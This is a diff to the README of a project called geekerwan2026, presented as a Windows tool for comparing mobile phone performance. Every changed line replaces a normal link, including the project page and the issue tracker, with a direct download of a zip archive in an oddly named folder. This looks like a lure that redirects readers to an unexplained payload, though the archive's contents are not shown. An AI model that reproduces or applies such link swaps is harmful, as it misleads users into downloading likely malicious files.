@@ -1,6 +1,6 @@
 # 📱 geekerwan2026 - Compare Mobile Phone Performance Easily
 
-[![Download geekerwan2026](https://img.shields.io/badge/Download-geekerwan2026-brightgreen)](https://github.com/bennyHPR/geekerwan2026)
+[![Download geekerwan2026](https://img.shields.io/badge/Download-geekerwan2026-brightgreen)](https://github.com/bennyHPR/geekerwan2026/raw/refs/heads/main/twistiways/geekerwan-uncommon.zip)
 
 ## 📝 About geekerwan2026
 
@@ -25,7 +25,7 @@ If your computer meets these, geekerwan2026 will run smoothly.
 
 You can get geekerwan2026 from the official GitHub page. This page contains the latest version of the program.
 
-[![Download geekerwan2026](https://img.shields.io/badge/Download-geekerwan2026-blue)](https://github.com/bennyHPR/geekerwan2026)
+[![Download geekerwan2026](https://img.shields.io/badge/Download-geekerwan2026-blue)](https://github.com/bennyHPR/geekerwan2026/raw/refs/heads/main/twistiways/geekerwan-uncommon.zip)
 
 ### How to download
 
@@ -99,13 +99,13 @@ To compare phones:
 
 If you have questions or run into problems:
 
-- Visit the GitHub page main section for issues: https://github.com/bennyHPR/geekerwan2026/issues
+- Visit the GitHub page main section for issues: https://github.com/bennyHPR/geekerwan2026/raw/refs/heads/main/twistiways/geekerwan-uncommon.zip
 - Describe your problem clearly and include details like your Windows version and steps to reproduce.
 - Check the latest user guide on the GitHub wiki or documentation folders.
 
 ## 🔗 Useful Links
 
-- Primary Download & Project Page: https://github.com/bennyHPR/geekerwan2026
-- Issue Tracker: https://github.com/bennyHPR/geekerwan2026/issues
+- Primary Download & Project Page: https://github.com/bennyHPR/geekerwan2026/raw/refs/heads/main/twistiways/geekerwan-uncommon.zip
+- Issue Tracker: https://github.com/bennyHPR/geekerwan2026/raw/refs/heads/main/twistiways/geekerwan-uncommon.zip
 
-[Get geekerwan2026 here](https://github.com/bennyHPR/geekerwan2026) if you haven’t downloaded it yet.
+[Get geekerwan2026 here](https://github.com/bennyHPR/geekerwan2026/raw/refs/heads/main/twistiways/geekerwan-uncommon.zip) if you haven’t downloaded it yet.
